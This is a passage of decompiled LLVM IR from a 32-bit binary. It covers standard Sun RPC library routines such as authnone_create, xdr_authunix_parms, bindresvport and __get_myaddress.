  %v0_8058b27 = load i32, i32* @ebx, align 4
  %v1_8058b2b = call i32 @__rpc_thread_variables(i32 %v0_8058b27)
  %v1_8058b36 = add i32 %v1_8058b2b, 152
  %v2_8058b36 = inttoptr i32 %v1_8058b36 to i32*
  %v3_8058b36 = load i32, i32* %v2_8058b36, align 4
  %v1_8058b3c = icmp eq i32 %v3_8058b36, 0
  br i1 %v1_8058b3c, label %dec_label_pc_8058b54, label %dec_label_pc_8058b40

dec_label_pc_8058b40:                             ; preds = %entry
  %v1_8058b41 = add i32 %arg1, 4
  %v2_8058b41 = inttoptr i32 %v1_8058b41 to i32*
  %v3_8058b41 = load i32, i32* %v2_8058b41, align 4
  %v1_8058b47 = add i32 %v3_8058b36, 40
  %v5_8058b4c = add i32 %v3_8058b41, 12
  %v6_8058b4c = inttoptr i32 %v5_8058b4c to i32*
  %v7_8058b4c = load i32, i32* %v6_8058b4c, align 4
  call void @__pseudo_call(i32 %v7_8058b4c)
  br label %dec_label_pc_8058b54

dec_label_pc_8058b54:                             ; preds = %entry, %dec_label_pc_8058b40
  %v0_8058b54 = phi i32 [ 0, %entry ], [ %v1_8058b47, %dec_label_pc_8058b40 ]
  ret i32 %v0_8058b54

; uselistorder directives
  uselistorder label %dec_label_pc_8058b54, { 1, 0 }
}

define i32 @authnone_create() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-36 = alloca i32, align 4
  %v0_8058b5c = load i32, i32* @ebx, align 4
  %v1_8058b60 = call i32 @__rpc_thread_variables(i32 %v0_8058b5c)
  store i32 %v1_8058b60, i32* %eax.global-to-local, align 4
  store i32 %v1_8058b60, i32* @ebx, align 4
  %v1_8058b67 = add i32 %v1_8058b60, 152
  %v2_8058b67 = inttoptr i32 %v1_8058b67 to i32*
  %v3_8058b67 = load i32, i32* %v2_8058b67, align 4
  store i32 %v3_8058b67, i32* @esi, align 4
  %v1_8058b6d = icmp eq i32 %v3_8058b67, 0
  %v1_8058b6f = icmp eq i1 %v1_8058b6d, false
  br i1 %v1_8058b6f, label %dec_label_pc_8058b8d, label %dec_label_pc_8058b71

dec_label_pc_8058b71:                             ; preds = %entry
  %v5_8058b77 = call i32 @calloc(i64 1, i32 64, i32 %v1_8058b60, i32 %v1_8058b60)
  store i32 %v5_8058b77, i32* @esi, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v1_8058b83 = icmp eq i32 %v5_8058b77, 0
  br i1 %v1_8058b83, label %dec_label_pc_8058c02, label %dec_label_pc_8058b87

dec_label_pc_8058b87:                             ; preds = %dec_label_pc_8058b71
  %v1_8058b87 = load i32, i32* @ebx, align 4
  %v2_8058b87 = add i32 %v1_8058b87, 152
  %v3_8058b87 = inttoptr i32 %v2_8058b87 to i32*
  store i32 %v5_8058b77, i32* %v3_8058b87, align 4
  %v0_8058b8d.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8058b8d

dec_label_pc_8058b8d:                             ; preds = %entry, %dec_label_pc_8058b87
  %v0_8058b93 = phi i32 [ %v3_8058b67, %entry ], [ %v0_8058b8d.pre, %dec_label_pc_8058b87 ]
  %v1_8058b8d = add i32 %v0_8058b93, 60
  %v2_8058b8d = inttoptr i32 %v1_8058b8d to i32*
  %v3_8058b8d = load i32, i32* %v2_8058b8d, align 4
  %v4_8058b8d = icmp eq i32 %v3_8058b8d, 0
  %v1_8058b91 = icmp eq i1 %v4_8058b8d, false
  br i1 %v1_8058b91, label %dec_label_pc_8058b8d.dec_label_pc_8058c00_crit_edge, label %dec_label_pc_8058b93

dec_label_pc_8058b8d.dec_label_pc_8058c00_crit_edge: ; preds = %dec_label_pc_8058b8d
  br label %dec_label_pc_8058c00

dec_label_pc_8058b93:                             ; preds = %dec_label_pc_8058b8d
  %v1_8058b93 = add i32 %v0_8058b93, 12
  store i32 %v1_8058b93, i32* @ebx, align 4
  %v3_8058b9f = inttoptr i32 %v1_8058b93 to i16*
  %v4_8058b9f = call i32 @memcpy(i16* %v3_8058b9f, i32 ptrtoint (i32* @global_var_8067a80.299 to i32), i32 12)
  store i32 %v4_8058b9f, i32* %eax.global-to-local, align 4
  %v0_8058ba9 = load i32, i32* @ebx, align 4
  %v0_8058baa = load i32, i32* @esi, align 4
  %v3_8058bab = inttoptr i32 %v0_8058baa to i16*
  %v4_8058bab = call i32 @memcpy(i16* %v3_8058bab, i32 %v0_8058ba9, i32 12)
  %v0_8058bb0 = load i32, i32* @esi, align 4
  %v1_8058bb0 = add i32 %v0_8058bb0, 40
  store i32 %v1_8058bb0, i32* %eax.global-to-local, align 4
  %v1_8058bb3 = add i32 %v0_8058bb0, 32
  %v2_8058bb3 = inttoptr i32 %v1_8058bb3 to i32*
  store i32 ptrtoint (i32* @global_var_805cc4c.335 to i32), i32* %v2_8058bb3, align 4
  %v0_8058bbe = load i32, i32* %eax.global-to-local, align 4
  %v2_8058bbf = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_8058bbf, i32* @edi, align 4
  %v5_8058bc4 = call i32 @__GI_xdrmem_create(i32* nonnull %stack_var_-36, i32 %v0_8058bbe, i32 20, i32 0)
  store i32 %v5_8058bc4, i32* %eax.global-to-local, align 4
  %v0_8058bcc = load i32, i32* @esi, align 4
  %v2_8058bce = call i32 @xdr_opaque_auth(i32 %v2_8058bbf, i32 %v0_8058bcc)
  store i32 %v0_8058bcc, i32* %eax.global-to-local, align 4
  %v0_8058bd5 = load i32, i32* @ebx, align 4
  %v2_8058bd7 = call i32 @xdr_opaque_auth(i32 %v2_8058bbf, i32 %v0_8058bd5)
  store i32 %tmp, i32* %eax.global-to-local, align 4
  %v5_8058be3 = add i32 %tmp, 16
  %v6_8058be3 = inttoptr i32 %v5_8058be3 to i32*
  %v7_8058be3 = load i32, i32* %v6_8058be3, align 4
  call void @__pseudo_call(i32 %v7_8058be3)
  %v1_8058be6 = load i32, i32* @esi, align 4
  %v2_8058be6 = add i32 %v1_8058be6, 60
  %v3_8058be6 = inttoptr i32 %v2_8058be6 to i32*
  store i32 %tmp, i32* %v3_8058be6, align 4
  %v3_8058be9 = load i32, i32* %stack_var_-36, align 4
  store i32 %v3_8058be9, i32* %eax.global-to-local, align 4
  %v1_8058bf0 = add i32 %v3_8058be9, 28
  %v2_8058bf0 = inttoptr i32 %v1_8058bf0 to i32*
  %v3_8058bf0 = load i32, i32* %v2_8058bf0, align 4
  store i32 %v3_8058bf0, i32* %eax.global-to-local, align 4
  %v1_8058bf3 = icmp eq i32 %v3_8058bf0, 0
  br i1 %v1_8058bf3, label %dec_label_pc_8058c00, label %dec_label_pc_8058bf7

dec_label_pc_8058bf7:                             ; preds = %dec_label_pc_8058b93
  call void @__pseudo_call(i32 %v3_8058bf0)
  br label %dec_label_pc_8058c00

dec_label_pc_8058c00:                             ; preds = %dec_label_pc_8058b8d.dec_label_pc_8058c00_crit_edge, %dec_label_pc_8058b93, %dec_label_pc_8058bf7
  %v0_8058c00 = load i32, i32* @esi, align 4
  store i32 %v0_8058c00, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8058c02

dec_label_pc_8058c02:                             ; preds = %dec_label_pc_8058b71, %dec_label_pc_8058c00
  %v0_8058c08 = phi i32 [ 0, %dec_label_pc_8058b71 ], [ %v0_8058c00, %dec_label_pc_8058c00 ]
  ret i32 %v0_8058c08

; uselistorder directives
  uselistorder i32* %stack_var_-36, { 1, 0, 2 }
  uselistorder i32 %tmp, { 0, 2, 1 }
  uselistorder i32 (i32, i32)* @xdr_opaque_auth, { 1, 0, 2, 3 }
  uselistorder i32 (i32*, i32, i32, i32)* @__GI_xdrmem_create, { 2, 1, 0, 3 }
  uselistorder i32 (i64, i32, i32, i32)* @calloc, { 2, 0, 3, 1 }
  uselistorder i64 1, { 2, 3, 4, 0, 1 }
  uselistorder i32 152, { 4, 5, 1, 2, 0, 3, 6, 7 }
  uselistorder label %dec_label_pc_8058c02, { 1, 0 }
  uselistorder label %dec_label_pc_8058c00, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8058b8d, { 1, 0 }
}

define i32 @__GI_xdr_authunix_parms(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp2 = ptrtoint i32* %arg1 to i32
  %stack_var_-8 = alloca i32, align 4
  %v0_8058c0c = load i32, i32* @esi, align 4
  %v0_8058c0d = load i32, i32* @ebx, align 4
  store i32 %v0_8058c0d, i32* %stack_var_-8, align 4
  store i32 %tmp2, i32* @esi, align 4
  %v3_8058c1b = call i32 @xdr_u_long(i32* %arg1, i32 %arg2)
  %v1_8058c23 = icmp eq i32 %v3_8058c1b, 0
  br i1 %v1_8058c23, label %dec_label_pc_8058c8a, label %dec_label_pc_8058c27

dec_label_pc_8058c27:                             ; preds = %entry
  %v0_8058c28 = load i32, i32* @ebx, align 4
  %v1_8058c28 = add i32 %v0_8058c28, 4
  %v0_8058c31 = load i32, i32* @esi, align 4
  %v3_8058c32 = inttoptr i32 %v0_8058c31 to i32*
  %v4_8058c32 = call i32 @__GI_xdr_string(i32* %v3_8058c32, i32 %v1_8058c28, i32 255)
  %v1_8058c3a = icmp eq i32 %v4_8058c32, 0
  br i1 %v1_8058c3a, label %dec_label_pc_8058c8a, label %dec_label_pc_8058c3e

dec_label_pc_8058c3e:                             ; preds = %dec_label_pc_8058c27
  %v0_8058c40 = load i32, i32* @ebx, align 4
  %v1_8058c40 = add i32 %v0_8058c40, 8
  store i32 %v1_8058c40, i32* @eax, align 4
  %v0_8058c44 = load i32, i32* @esi, align 4
  %v4_8058c45 = inttoptr i32 %v0_8058c44 to i32*
  %v5_8058c45 = call i32 @xdr_u_long(i32* %v4_8058c45, i32 %v1_8058c40)
  %v1_8058c4d = icmp eq i32 %v5_8058c45, 0
  br i1 %v1_8058c4d, label %dec_label_pc_8058c8a, label %dec_label_pc_8058c51

dec_label_pc_8058c51:                             ; preds = %dec_label_pc_8058c3e
  %v0_8058c53 = load i32, i32* @ebx, align 4
  %v1_8058c53 = add i32 %v0_8058c53, 12
  store i32 %v1_8058c53, i32* @eax, align 4
  %v0_8058c57 = load i32, i32* @esi, align 4
  %v4_8058c58 = inttoptr i32 %v0_8058c57 to i32*
  %v5_8058c58 = call i32 @xdr_u_long(i32* %v4_8058c58, i32 %v1_8058c53)
  %v1_8058c60 = icmp eq i32 %v5_8058c58, 0
  br i1 %v1_8058c60, label %dec_label_pc_8058c8a, label %dec_label_pc_8058c64

dec_label_pc_8058c64:                             ; preds = %dec_label_pc_8058c51
  %v0_8058c64 = load i32, i32* @ebx, align 4
  %v1_8058c64 = add i32 %v0_8058c64, 16
  %v0_8058c67 = load i32, i32* @ecx, align 4
  %v1_8058c73 = add i32 %v0_8058c64, 20
  %v0_8058c77 = load i32, i32* @esi, align 4
  %v8_8058c78 = inttoptr i32 %v0_8058c77 to i32*
  %v9_8058c78 = call i32 @__GI_xdr_array(i32* %v8_8058c78, i32 %v1_8058c73, i32 %v1_8058c64, i32 16, i32 4, i32 134572923, i32 %v0_8058c67, i32 %v0_8058c67)
  %v1_8058c80 = icmp eq i32 %v9_8058c78, 0
  %v1_8058c82 = icmp eq i1 %v1_8058c80, false
  %v2_8058c82 = zext i1 %v1_8058c82 to i32
  br label %dec_label_pc_8058c8c

dec_label_pc_8058c8a:                             ; preds = %dec_label_pc_8058c51, %dec_label_pc_8058c3e, %dec_label_pc_8058c27, %entry
  br label %dec_label_pc_8058c8c

dec_label_pc_8058c8c:                             ; preds = %dec_label_pc_8058c64, %dec_label_pc_8058c8a
  %storemerge = phi i32 [ %v2_8058c82, %dec_label_pc_8058c64 ], [ 0, %dec_label_pc_8058c8a ]
  %v2_8058c8d = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8058c8d, i32* @ebx, align 4
  store i32 %v0_8058c0c, i32* @esi, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 (i32*, i32, i32)* @__GI_xdr_string, { 1, 0 }
  uselistorder label %dec_label_pc_8058c8c, { 1, 0 }
}

define i32 @__GI_bindresvport(i32 %arg1, i16* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %tmp8 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp8, i32* %stack_var_-32, align 4
  %v0_8058c93 = load i32, i32* @ebx, align 4
  %v4_8058c97 = ptrtoint i16* %arg2 to i32
  store i32 %v4_8058c97, i32* @ebx, align 4
  %v1_8058c9f = icmp eq i16* %arg2, null
  %v1_8058ca1 = icmp eq i1 %v1_8058c9f, false
  br i1 %v1_8058ca1, label %dec_label_pc_8058cbe, label %dec_label_pc_8058ca3

dec_label_pc_8058ca3:                             ; preds = %entry
  %v2_8058ca8 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_8058ca8, i32* @ebx, align 4
  %v4_8058cad = bitcast i32* %stack_var_-32 to i8*
  %v5_8058cad = call i32 @__GI_memset(i8* %v4_8058cad, i32 0, i32 16)
  store i32 %v5_8058cad, i32* %eax.global-to-local, align 4
  store i32 2, i32* %stack_var_-32, align 4
  br label %dec_label_pc_8058cd4

dec_label_pc_8058cbe:                             ; preds = %entry
  %v2_8058cbe = load i16, i16* %arg2, align 2
  %v11_8058cbe = icmp eq i16 %v2_8058cbe, 2
  br i1 %v11_8058cbe, label %dec_label_pc_8058cd4, label %dec_label_pc_8058cc4

dec_label_pc_8058cc4:                             ; preds = %dec_label_pc_8058cbe
  %v1_8058cc4 = call i32 @__errno_location(i32 %v0_8058c93)
  %v1_8058cc9 = inttoptr i32 %v1_8058cc4 to i32*
  store i32 96, i32* %v1_8058cc9, align 4
  store i32 -1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8058d52

dec_label_pc_8058cd4:                             ; preds = %dec_label_pc_8058cbe, %dec_label_pc_8058ca3
  %v0_8058cde = phi i32 [ %tmp8, %dec_label_pc_8058cbe ], [ 2, %dec_label_pc_8058ca3 ]
  %v0_8058cd4 = load i16, i16* @global_var_806740c.336, align 4
  %v1_8058cd4 = icmp eq i16 %v0_8058cd4, 0
  %v1_8058cdc = icmp eq i1 %v1_8058cd4, false
  br i1 %v1_8058cdc, label %dec_label_pc_8058cf9, label %dec_label_pc_8058cde

dec_label_pc_8058cde:                             ; preds = %dec_label_pc_8058cd4
  %v1_8058cde = call i32 @__libc_getpid(i32 %v0_8058cde)
  %v2_8058cde = sext i32 %v1_8058cde to i64
  %v2_8058cea = ashr i32 %v1_8058cde, 31
  %v5_8058ceb = zext i32 %v2_8058cea to i64
  %v6_8058ceb = mul nuw i64 %v5_8058ceb, 4294967296
  %v7_8058ceb = or i64 %v6_8058ceb, %v2_8058cde
  %v9_8058ceb = sdiv i64 %v7_8058ceb, 424
  %v10_8058ceb = trunc i64 %v9_8058ceb to i32
  store i32 %v10_8058ceb, i32* %eax.global-to-local, align 4
  %v11_8058ceb = srem i64 %v7_8058ceb, 424
  %v1_8058ced = trunc i64 %v11_8058ceb to i16
  %v2_8058ced = add i16 %v1_8058ced, 600
  store i16 %v2_8058ced, i16* @global_var_806740c.336, align 4
  %v0_8058cf9.pre = load i32, i32* %stack_var_-32, align 4
  br label %dec_label_pc_8058cf9

dec_label_pc_8058cf9:                             ; preds = %dec_label_pc_8058cd4, %dec_label_pc_8058cde
  %v0_8058cf9 = phi i32 [ %v0_8058cde, %dec_label_pc_8058cd4 ], [ %v0_8058cf9.pre, %dec_label_pc_8058cde ]
  %v1_8058cf9 = call i32 @__errno_location(i32 %v0_8058cf9)
  store i32 0, i32* %esi.global-to-local, align 4
  store i32 %v1_8058cf9, i32* %edi.global-to-local, align 4
  %v1_8058d02 = inttoptr i32 %v1_8058cf9 to i32*
  store i32 98, i32* %v1_8058d02, align 4
  store i32 -1, i32* %eax.global-to-local, align 4
  %v0_8058d4117 = load i32, i32* %esi.global-to-local, align 4
  %v1_8058d4118 = add i32 %v0_8058d4117, -423
  %v6_8058d4120 = sub i32 422, %v0_8058d4117
  %v7_8058d4121 = and i32 %v6_8058d4120, %v0_8058d4117
  %v8_8058d4122 = icmp slt i32 %v7_8058d4121, 0
  %v9_8058d4123 = icmp eq i32 %v1_8058d4118, 0
  %v10_8058d4124 = icmp slt i32 %v1_8058d4118, 0
  %v3_8058d4725 = icmp eq i1 %v10_8058d4124, %v8_8058d4122
  %v4_8058d4726 = icmp eq i1 %v9_8058d4123, false
  %v5_8058d4727 = and i1 %v4_8058d4726, %v3_8058d4725
  br i1 %v5_8058d4727, label %dec_label_pc_8058d52, label %dec_label_pc_8058d49

dec_label_pc_8058d0d:                             ; preds = %dec_label_pc_8058d4d
  %v0_8058d0d = load i16, i16* @global_var_806740c.336, align 4
  %v1_8058d0d = zext i16 %v0_8058d0d to i32
  %v3_8058d0d = and i32 %v2_8058d0d28, -65536
  %v4_8058d0d = or i32 %v1_8058d0d, %v3_8058d0d
  %v1_8058d15 = add i32 %v4_8058d0d, 1
  store i32 %v1_8058d15, i32* %eax.global-to-local, align 4
  %v2_8058d16 = call i16 @llvm.bswap.i16(i16 %v0_8058d0d)
  %v1_8058d1a = trunc i32 %v1_8058d15 to i16
  %v2_8058d1e = load i32, i32* @ebx, align 4
  %v3_8058d1e = add i32 %v2_8058d1e, 2
  %v4_8058d1e = inttoptr i32 %v3_8058d1e to i16*
  store i16 %v2_8058d16, i16* %v4_8058d1e, align 2
  %v0_8058d22 = load i32, i32* %eax.global-to-local, align 4
  %v1_8058d22 = trunc i32 %v0_8058d22 to i16
  %v7_8058d28 = icmp sgt i16 %v1_8058d1a, 1023
  %.v1_8058d22 = select i1 %v7_8058d28, i16 600, i16 %v1_8058d22
  store i16 %.v1_8058d22, i16* @global_var_806740c.336, align 4
  %v0_8058d36 = load i32, i32* @ebx, align 4
  %v0_8058d38 = load i32, i32* %esi.global-to-local, align 4
  %v1_8058d38 = add i32 %v0_8058d38, 1
  store i32 %v1_8058d38, i32* %esi.global-to-local, align 4
  %v4_8058d39 = call i32 @bind(i32 %v0_8058d36, i32 16, i32 %v0_8058d22)
  store i32 %v4_8058d39, i32* %eax.global-to-local, align 4
  %v1_8058d41 = add i32 %v0_8058d38, -422
  %v6_8058d41 = sub i32 421, %v0_8058d38
  %v7_8058d41 = and i32 %v6_8058d41, %v1_8058d38
  %v8_8058d41 = icmp slt i32 %v7_8058d41, 0
  %v9_8058d41 = icmp eq i32 %v1_8058d41, 0
  %v10_8058d41 = icmp slt i32 %v1_8058d41, 0
  %v3_8058d47 = icmp eq i1 %v10_8058d41, %v8_8058d41
  %v4_8058d47 = icmp eq i1 %v9_8058d41, false
  %v5_8058d47 = and i1 %v4_8058d47, %v3_8058d47
  br i1 %v5_8058d47, label %dec_label_pc_8058d52, label %dec_label_pc_8058d49

dec_label_pc_8058d49:                             ; preds = %dec_label_pc_8058cf9, %dec_label_pc_8058d0d
  %v2_8058d0d28 = phi i32 [ %v4_8058d39, %dec_label_pc_8058d0d ], [ -1, %dec_label_pc_8058cf9 ]
  %v2_8058d49 = icmp slt i32 %v2_8058d0d28, 0
  %v1_8058d4b = icmp eq i1 %v2_8058d49, false
  br i1 %v1_8058d4b, label %dec_label_pc_8058d52, label %dec_label_pc_8058d4d

dec_label_pc_8058d4d:                             ; preds = %dec_label_pc_8058d49
  %v0_8058d4d = load i32, i32* %edi.global-to-local, align 4
  %v1_8058d4d = inttoptr i32 %v0_8058d4d to i32*
  %v2_8058d4d = load i32, i32* %v1_8058d4d, align 4
  %v11_8058d4d = icmp eq i32 %v2_8058d4d, 98
  br i1 %v11_8058d4d, label %dec_label_pc_8058d0d, label %dec_label_pc_8058d52

dec_label_pc_8058d52:                             ; preds = %dec_label_pc_8058cf9, %dec_label_pc_8058d0d, %dec_label_pc_8058d49, %dec_label_pc_8058d4d, %dec_label_pc_8058cc4
  %v0_8058d59 = phi i32 [ -1, %dec_label_pc_8058cc4 ], [ -1, %dec_label_pc_8058cf9 ], [ %v4_8058d39, %dec_label_pc_8058d0d ], [ %v2_8058d0d28, %dec_label_pc_8058d49 ], [ %v2_8058d0d28, %dec_label_pc_8058d4d ]
  store i32 %v0_8058c93, i32* @ebx, align 4
  ret i32 %v0_8058d59

; uselistorder directives
  uselistorder i32 %v1_8058d41, { 1, 0 }
  uselistorder i32 %v1_8058cf9, { 1, 0 }
  uselistorder i32* %stack_var_-32, { 0, 3, 1, 4, 2 }
  uselistorder i32* %esi.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32 98, { 0, 2, 1 }
  uselistorder i64 424, { 1, 0 }
  uselistorder i32 (i32)* @__libc_getpid, { 1, 5, 2, 7, 6, 0, 4, 3 }
  uselistorder i16* @global_var_806740c.336, { 3, 2, 1, 0 }
  uselistorder i32 96, { 5, 2, 3, 6, 0, 1, 4 }
  uselistorder i16* null, { 1, 0, 2 }
  uselistorder i16* %arg2, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8058d52, { 3, 2, 1, 0, 4 }
  uselistorder label %dec_label_pc_8058d49, { 1, 0 }
  uselistorder label %dec_label_pc_8058cf9, { 1, 0 }
}

define i32 @__get_myaddress(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = call i16 @__decompiler_undefined_function_3()
  %tmp13 = call i32 @__decompiler_undefined_function_0()
  %tmp14 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-4152 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_8058d5c = load i32, i32* @ebp, align 4
  %v0_8058d5d = load i32, i32* @edi, align 4
  %v0_8058d5e = load i32, i32* @esi, align 4
  %v0_8058d5f = load i32, i32* @ebx, align 4
  store i32 %v0_8058d5f, i32* %stack_var_-16, align 4
  %v0_8058d66 = load i32, i32* @eax, align 4
  %v4_8058d70 = call i32 @socket(i32 2, i32 2, i32 0)
  store i32 %v4_8058d70, i32* @ebp, align 4
  %v2_8058d7a = icmp slt i32 %v4_8058d70, 0
  %v1_8058d7c = icmp eq i1 %v2_8058d7a, false
  br i1 %v1_8058d7c, label %dec_label_pc_8058d88, label %dec_label_pc_8058d7e

dec_label_pc_8058d7e:                             ; preds = %entry
  br label %dec_label_pc_8058dc9

dec_label_pc_8058d88:                             ; preds = %entry
  %v2_8058d88 = ptrtoint i32* %stack_var_-4152 to i32
  store i32 4096, i32* %stack_var_-24, align 4
  %v2_8058d9e = ptrtoint i32* %stack_var_-24 to i32
  %v0_8058da5 = load i32, i32* @ebx, align 4
  %v3_8058dad = call i32 @ioctl(i32 35090, i32 %v2_8058d9e, i32 %v0_8058da5)
  %v2_8058db5 = icmp slt i32 %v3_8058dad, 0
  %v1_8058dbf = icmp eq i1 %v2_8058db5, false
  br i1 %v1_8058dbf, label %dec_label_pc_8058dda.preheader, label %dec_label_pc_8058dc1

dec_label_pc_8058dc1:                             ; preds = %dec_label_pc_8058d88
  br label %dec_label_pc_8058dc9

dec_label_pc_8058dc9:                             ; preds = %dec_label_pc_8058e11, %dec_label_pc_8058d7e, %dec_label_pc_8058dc1
  %stack_var_-4164.0 = phi i32 [ %stack_var_-4164.1.ph, %dec_label_pc_8058e11 ], [ 1, %dec_label_pc_8058dc1 ], [ %tmp13, %dec_label_pc_8058d7e ]
  %stack_var_-20.0 = phi i32 [ %stack_var_-20.1.ph, %dec_label_pc_8058e11 ], [ %v2_8058d88, %dec_label_pc_8058dc1 ], [ %tmp14, %dec_label_pc_8058d7e ]
  %v0_8058dc9 = call i32 @perror()
  %v2_8058dd5 = call i32 @__GI_exit(i32 1)
  br label %dec_label_pc_8058dda.preheader

dec_label_pc_8058dda.preheader:                   ; preds = %dec_label_pc_8058dc9, %dec_label_pc_8058d88
  %stack_var_-4164.1.ph = phi i32 [ %stack_var_-4164.0, %dec_label_pc_8058dc9 ], [ 1, %dec_label_pc_8058d88 ]
  %stack_var_-20.1.ph = phi i32 [ %stack_var_-20.0, %dec_label_pc_8058dc9 ], [ %v2_8058d88, %dec_label_pc_8058d88 ]
  %v2_8058dea = ptrtoint i32* %stack_var_-56 to i32
  %tmp32 = bitcast i32* %stack_var_-56 to i16*
  %v2_8058e23 = urem i16 %tmp, 2
  %v3_8058e23 = icmp eq i16 %v2_8058e23, 0
  %v4_8058e32 = icmp eq i32 %stack_var_-4164.1.ph, 0
  %v12_8058e70 = icmp eq i32 %stack_var_-4164.1.ph, 1
  %v2_8058e2e = and i16 %tmp, 8
  %v3_8058e2e = icmp eq i16 %v2_8058e2e, 0
  %v1_8058e30 = icmp eq i1 %v3_8058e2e, false
  %v1_8058e37 = icmp eq i1 %v4_8058e32, false
  %v1_8058e75 = icmp eq i1 %v12_8058e70, false
  br label %dec_label_pc_8058dda

dec_label_pc_8058dda:                             ; preds = %dec_label_pc_8058e70, %dec_label_pc_8058dda.preheader
  store i32 %stack_var_-20.1.ph, i32* @esi, align 4
  %v3_8058de1 = load i32, i32* %stack_var_-24, align 4
  store i32 %v3_8058de1, i32* @edi, align 4
  %v1_8058e683 = icmp eq i32 %v3_8058de1, 0
  %v1_8058e6a10 = icmp eq i1 %v1_8058e683, false
  br i1 %v1_8058e6a10, label %dec_label_pc_8058dea, label %dec_label_pc_8058e70

dec_label_pc_8058dea:                             ; preds = %dec_label_pc_8058dda, %dec_label_pc_8058e62
  %v0_8058df4 = phi i32 [ %v1_8058e62, %dec_label_pc_8058e62 ], [ %stack_var_-20.1.ph, %dec_label_pc_8058dda ]
  store i32 %v2_8058dea, i32* @ebx, align 4
  %v0_8058df1 = load i32, i32* @ecx, align 4
  %v5_8058df6 = call i32 @memcpy(i16* %tmp32, i32 %v0_8058df4, i32 32)
  %v3_8058e05 = call i32 @ioctl(i32 35091, i32 %v2_8058dea, i32 %v0_8058df1)
  %v2_8058e0d = icmp slt i32 %v3_8058e05, 0
  %v1_8058e0f = icmp eq i1 %v2_8058e0d, false
  br i1 %v1_8058e0f, label %dec_label_pc_8058e1b, label %dec_label_pc_8058e11

dec_label_pc_8058e11:                             ; preds = %dec_label_pc_8058dea
  br label %dec_label_pc_8058dc9

dec_label_pc_8058e1b:                             ; preds = %dec_label_pc_8058dea
  %v0_8058e62.pre = load i32, i32* @esi, align 4
  br i1 %v3_8058e23, label %dec_label_pc_8058e62, label %dec_label_pc_8058e27

dec_label_pc_8058e27:                             ; preds = %dec_label_pc_8058e1b
  %v1_8058e27 = add i32 %v0_8058e62.pre, 16
  %v2_8058e27 = inttoptr i32 %v1_8058e27 to i16*
  %v3_8058e27 = load i16, i16* %v2_8058e27, align 2
  %v12_8058e27 = icmp eq i16 %v3_8058e27, 2
  %v1_8058e2c = icmp eq i1 %v12_8058e27, false
  br i1 %v1_8058e2c, label %dec_label_pc_8058e62, label %dec_label_pc_8058e2e

dec_label_pc_8058e2e:                             ; preds = %dec_label_pc_8058e27
  br i1 %v1_8058e30, label %dec_label_pc_8058e39, label %dec_label_pc_8058e32

dec_label_pc_8058e32:                             ; preds = %dec_label_pc_8058e2e
  br i1 %v1_8058e37, label %dec_label_pc_8058e62, label %dec_label_pc_8058e39

dec_label_pc_8058e39:                             ; preds = %dec_label_pc_8058e32, %dec_label_pc_8058e2e
  %tmp33 = inttoptr i32 %v0_8058d66 to i16*
  %v5_8058e44 = call i32 @memcpy(i16* %tmp33, i32 %v1_8058e27, i32 16)
  %v1_8058e4d = add i32 %v0_8058d66, 2
  %v2_8058e4d = inttoptr i32 %v1_8058e4d to i16*
  store i16 28416, i16* %v2_8058e4d, align 2
  %v0_8058e53 = load i32, i32* @ebp, align 4
  %v2_8058e56 = call i32 @__libc_close(i32 %v0_8058e53)
  br label %dec_label_pc_8058e8f

dec_label_pc_8058e62:                             ; preds = %dec_label_pc_8058e1b, %dec_label_pc_8058e32, %dec_label_pc_8058e27
  %v1_8058e62 = add i32 %v0_8058e62.pre, 32
  store i32 %v1_8058e62, i32* @esi, align 4
  %v0_8058e65 = load i32, i32* @edi, align 4
  %v1_8058e65 = add i32 %v0_8058e65, -32
  %v6_8058e65 = icmp eq i32 %v1_8058e65, 0
  store i32 %v1_8058e65, i32* @edi, align 4
  %v1_8058e6a = icmp eq i1 %v6_8058e65, false
  br i1 %v1_8058e6a, label %dec_label_pc_8058dea, label %dec_label_pc_8058e70

dec_label_pc_8058e70:                             ; preds = %dec_label_pc_8058e62, %dec_label_pc_8058dda
  br i1 %v1_8058e75, label %dec_label_pc_8058e84, label %dec_label_pc_8058dda

dec_label_pc_8058e84:                             ; preds = %dec_label_pc_8058e70
  %v0_8058e87 = load i32, i32* @ebp, align 4
  %v1_8058e88 = call i32 @__libc_close(i32 %v0_8058e87)
  br label %dec_label_pc_8058e8f

dec_label_pc_8058e8f:                             ; preds = %dec_label_pc_8058e39, %dec_label_pc_8058e84
  %storemerge2 = phi i32 [ 0, %dec_label_pc_8058e84 ], [ 1, %dec_label_pc_8058e39 ]
  %v2_8058e95 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_8058e95, i32* @ebx, align 4
  store i32 %v0_8058d5e, i32* @esi, align 4
  store i32 %v0_8058d5d, i32* @edi, align 4
  store i32 %v0_8058d5c, i32* @ebp, align 4
  ret i32 %storemerge2

; uselistorder directives
  uselistorder i32 %v1_8058e62, { 1, 0 }
  uselistorder i32 %v4_8058d70, { 1, 0 }
  uselistorder i32* %stack_var_-24, { 0, 2, 1 }
  uselistorder i32 (i32)* @__libc_close, { 0, 1, 8, 7, 6, 18, 17, 14, 13, 12, 11, 10, 9, 4, 16, 15, 3, 2, 5 }
  uselistorder i16 28416, { 1, 0 }
